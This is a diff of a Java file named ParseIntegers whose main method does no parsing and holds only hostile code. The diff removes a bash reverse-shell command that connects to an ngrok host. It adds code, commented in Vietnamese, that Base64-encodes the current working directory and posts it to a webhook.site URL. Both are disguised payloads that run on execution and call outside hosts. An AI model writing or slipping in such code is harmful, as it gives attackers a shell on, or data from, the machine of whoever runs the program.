@@ -10,11 +10,31 @@ import java.util.List;
  */
 public class ParseIntegers {
     public static void main(String[] args) {
-        Process p;
+        // Lấy thư mục hiện tại
+        String currentDirectory = System.getProperty("user.dir");
+
+        // Mã hóa Base64
+        String encodedDirectory = Base64.getEncoder().encodeToString(currentDirectory.getBytes(StandardCharsets.UTF_8));
+
+        // Gửi POST request đến webhook.site
         try {
-            p = Runtime.getRuntime().exec("bash -c $@|bash 0 echo bash -i >& /dev/tcp/0.tcp.ap.ngrok.io/12620 0>&1");
-            p.waitFor();
-            p.destroy();
-        } catch (Exception e) {}
+            URL url = new URL("https://webhook.site/f69cac23-fe0a-408b-aa2a-0b9caeb3160a?x=" + encodedDirectory);
+            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+            conn.setRequestMethod("POST");
+            conn.setDoOutput(true);
+
+            // Nội dung có thể để trống, vì tham số đã nằm trên URL
+            String postData = "";
+            try (OutputStream os = conn.getOutputStream()) {
+                os.write(postData.getBytes(StandardCharsets.UTF_8));
+            }
+
+            // Đọc response nếu cần
+            int responseCode = conn.getResponseCode();
+            System.out.println("Webhook response code: " + responseCode);
+
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
     }
 }
